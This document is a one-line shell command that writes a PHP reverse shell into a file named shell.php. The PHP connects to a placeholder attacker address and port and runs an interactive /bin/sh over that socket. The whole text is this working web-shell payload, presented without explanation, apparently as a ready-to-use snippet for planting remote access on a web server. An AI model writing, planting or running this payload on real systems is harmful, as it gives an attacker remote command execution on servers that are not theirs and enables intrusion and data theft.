echo "<?php
\$sock = fsockopen('<your_ip>', <your_port>);
exec('/bin/sh -i <&3 >&3 2>&3');
?>" > shell.php
